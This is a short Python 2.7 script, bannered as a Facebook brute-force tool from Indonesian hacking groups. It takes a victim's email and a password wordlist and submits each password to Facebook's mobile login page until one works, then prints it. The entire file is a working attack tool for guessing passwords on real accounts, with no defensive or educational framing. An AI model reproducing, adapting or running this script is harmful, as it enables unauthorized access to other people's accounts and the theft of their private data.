#!/bin/env python2.7
import os
import sys
import requests
class Main:
    def __init__(self,x,y):
        self.email = x
        self.url = 'https://m.facebook.com/login'
        self.ex = open(y, 'r').readlines()
    def main(self):
        for line in self.ex:
            password = line.strip()
            http = requests.post(self.url, data={'email': self.email, 'pass': password, 'login': 'submit'})
            content = http.content
            if 'Beranda' in content:
                print ('\x1b[1;32;40mPASSWORD => '+password+' [ benar ]')
                sys.exit(1)
            else:
                print('\x1b[1;31;40mPASSWORD => '+password+' [ salah ]')
try:
    if os.system("ping -c 1 " + "google.com") == 0:
        os.system("clear")
        print ('\x1b[1;31;40m [ ======== FACEBOOK BRUTEFORCE WITH WORDLIST ======= ]')
        print ('\x1b[1;31;40m [ ================ TUANB4DUT X QYWOK =============== ]')
        print ('\x1b[1;31;40m [ ========== https://github.com/belajarqywok ======= ]')
        print ('\x1b[1;37;40m [ =========== INDONESIAN TERMUX ASSOCIATION ======== ]')
        print ('\x1b[1;37;40m [ ============= D35TR0Y SQUAD X QNETICS ============ ]')
        print ('\x1b[1;37;40m [ ===================== INDONESIA ================== ]')
        mail=sys.argv[1]
        wfile=sys.argv[2]
        if __name__ == '__main__':
            Main(mail,wfile).main()
    else:
        os.system("clear")
        print('\x1b[1;31;40mKoneksi internet anda bermasalah')
except KeyboardInterrupt:
    os.system("clear")
    print('\x1b[1;31;40mKeluar dari program')
except IndexError:
    os.system("clear")
    print("masukan nama email/wordlist terlebih dahulu")
